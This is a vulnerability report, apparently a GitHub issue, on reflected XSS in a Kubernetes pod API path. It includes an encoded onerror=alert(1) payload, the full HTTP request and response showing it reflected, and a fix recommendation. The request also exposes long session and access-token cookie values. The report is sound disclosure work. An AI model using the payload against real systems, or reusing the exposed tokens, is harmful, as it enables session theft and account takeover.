Kubernetes URL has Cross Site Scripting (Reflected) vulnerability


/kind bug
Description
Cross-Site Scripting (XSS) attacks occur when data enters a Web application through an untrusted source, most frequently a web request and the data is included in dynamic content that is sent to a web user without being validated for malicious content. The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute.
It is observed in server error, user input reflects without encoding.
Note: We have observed that the application responds with the 404 page with the injected JavaScript and content-type is text/html throughout the application.
Affected URL/API(s)
/api/v1/namespaces/kube-system/pods/heapster-d5c99f75b-fj7jx [URL path filename]
Vector
img%20src%3da%20onerror%3dalert(1)%3ez24qy
Request/Response
REQUEST
GET /api/v1/namespaces/kube-system/pods/heapster-d5c99f75b- fj7jxium3i%3cimg%20src%3da%20onerror%3dalert(1)%3ez24qy HTTP/1.1
Host: 9.30.220.229:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://9.30.220.229:8001/workloads/deployments/kube-system/heapster/pods/heapster-d5c99f75b-fj7jx
content-type: application/json
x-requested-with: XMLHttpRequest
origin: https://9.30.220.229:8001
Cookie: JSESSIONID=0000Fkx9WjTGJQYtQRSatQPPl57:79f75479-6cf0-484e-9535-2b48d55abc78; WAS_n581030044=zlzcyOWYBBxoS2hklvvOl9o78ZhTFA5mQf19wYofFtNpn0/Jka0Pi2KJWXt0T1uGAO VfxNLZ0+jf3Ilhg4IKWCXG3ZNMEVI73ui+3bOmQc1GtbjtbtlK7MKMyETIvtKMDKM4L49+CON79t58n9q CmvF+LWu6fR70KpQmZwR7H86JKlOT/mGPwhguv0x2t5GgyO6wHiNVAOb3QM63KL4XI5AhX+kWep6 er5oPERu4hI/GyTxfncrVnmjXtVCO+08zzjSClpkncokPFeCnR2O4fEW2z4okH5krsnU2yK77f1vDwWbwS mh0tljO/HO6zH/e; cfc-acs-auth-
cookie=f1cb51679d5f559617782162f1140f1b131967d659e5719f7cfeecdce02885d35559cf121a69a6 a5da6373ebd0d59bc1cedf02375b880fbc0e5f9b296ef1100be53902e6f4d32631d94b0db5153bf487b 1b44dab56230152350c654387b26b65c1be26182b73355df35c1747332ae6ce521e84ed8df17695a71 dfbbd3744a69f130677d94b1498ba16f6445df901af9b6633ac55edd641a47dc519a9c3fb6524750b3fd 3a2507cd7df75ba1e33f2b4587d8a6c50782ef1ef5d45f16c9d15ce90b8c67eb9400b3bee8479b26a26 6bacfa7cb02b6805f6aa48290ac338efa3950c6b828146efeb8ee323dce2219b8d4612ddcdf333c65360 dd9cc96e5bc07bf460e5c42678d02fa28f8fc2d5f56e31fe7a32f887fecc9431d8a873603029143f9cfab6 e193ef5c1fd12dbfafe9f0fdbc37da0d75c181f51e9b2a3d6af148864e78eca49b2b67b75bf320162a883 7c2e255a32c5e202b2d15a490178fe93811c8b07578519de65b435631d13be35c218f560bd82fe4730 9be92d1ecfce0e97d564b1fdf7eec4f264f87c2b67b9a1bb4d13a8c39b16f35150416662b04a856ad8d1 29817f5a64010d5c9c7c24bb5b1f4597d58d1b2a26c01bc288094801295876c5be22c71f2bcbb86b524 65f35e9c9080a24f2a84ab90d5ffcbd46f689e719755389c820f97b19a2401a0cd5892539b3e72a3fe77 4d2908929835a4ca4a9fd0c6e5; cfc-access-token-
cookie=f1cb51679d5f559617782162f1140f1b131967d659e5719f7cfeecdce02885d35559cf121a69a6 a5da6373ebd0d59bc1cedf02375b880fbc0e5f9b296ef1100be53902e6f4d32631d94b0db5153bf487b 1b44dab56230152350c654387b26b65c1be26182b73355df35c1747332ae6ce521e84ed8df17695a71 dfbbd3744a69f130677d94b1498ba16f6445df901af9b6633ac55edd641a47dc519a9c3fb6524750b3fd 3a2507cd7df75ba1e33f2b4587d8a6c50782ef1ef5d45f16c9d15ce90b8c67eb9400b3bee8479b26a26 6bacfa7cb02b6805f6aa48290ac338efa3950c6b828146efeb8ee323dce2219b8d4612ddcdf333c65360 dd9cc96e5bc07bf460e5c42678d02fa28f8fc2d5f56e31fe7a32f887fecc9431d8a873603029143f9cfab6 e193ef5c1fd12dbfafe9f0fdbc37da0d75c181f51e9b2a3d6af148864e78eca49b2b67b75bf320162a883 7c2e255a32c5e202b2d15a490178fe93811c8b07578519de65b435631d13be35c218f560bd82fe4730 9be92d1ecfce0e97d564b1fdf7eec4f264f87c2b67b9a1bb4d13a8c39b16f35150416662b04a856ad8d1
29817f5a64010d5c9c7c24bb5b1f4597d58d1b2a26c01bc288094801295876c5be22c71f2bcbb86b524 65f35e9c9080a24f2a84ab90d5ffcbd46f689e719755389c820f97b19a2401a0cd5892539b3e72a3fe77 4d2908929835a4ca4a9fd0c6e5; toggles=%7B%7D
Connection: close
RESPONSE
HTTP/1.1 404 Not Found
Server: openresty/1.11.2.4
Date: Wed, 26 Sep 2018 16:00:07 GMT Content-Type: text/html; charset=utf-8 Content-Length: 687
Connection: close
X-Powered-By: Express
ETag: W/"2af-89s1Ff4mJes9H+usFCBFjzmazGo"
Unexpected response code 404 from request:
GET https://management-ingress:8001/v1/namespaces/kube- system/pods/heapster-d5c99f75b-fj7jxium3iz24qy HTTP/1.1 Authorization: Bearer ***
HTTP/1.1 404
Server: openresty/1.11.2.4
Date: Wed, 26 Sep 2018 16:00:07 GMT Content-Type: application/json Content-Length: 312
Connection: close
{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"pods \"helm-api- d5c99f75b-fj7jxium3i\u003cimg src=a onerror=alert(1)\u003ez24qy\" not found","reason":"NotFound","details":{"name":"helm-api-d5c99f75b-fj7jxium3i\u003cimg src=a onerror=alert(1)\u003ez24qy","kind":"pods"},"code":404}
Risk Assessment
The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials or performing arbitrary actions on the victim's behalf.
Fix Recommendation
Perform sanitization on input strings. Use an "accept known good" input validation strategy, whitelist
of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications or transform it into something that does. User input should be HTML- encoded at any point where it is copied into application responses. All HTML metacharacters, including < > " ' and =, should be replaced with the corresponding HTML entities (< > etc).
